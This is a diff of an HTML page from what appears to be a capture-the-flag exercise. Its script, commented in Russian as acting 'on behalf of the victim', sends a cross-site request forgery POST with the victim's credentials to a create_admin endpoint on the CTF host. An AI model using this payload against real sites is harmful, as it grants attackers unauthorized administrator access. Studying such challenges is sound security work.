@@ -3,11 +3,11 @@
 <body>
 <script>
   // Отправляем POST-запрос на create_admin от имени жертвы
-  fetch("https://tasks.goidactf.ru:20061/create_admin", {
+  fetch("tasks.goidactf.ru:20146/create_admin", {
   "headers": {
     "accept": "*/*",
   },
-  "referrer": "https://tasks.goidactf.ru:20061/admin",
+  "referrer": "tasks.goidactf.ru:20146/admin",
   "body": "new_admin_login=123",
   "method": "POST",
   credentials: 'include',
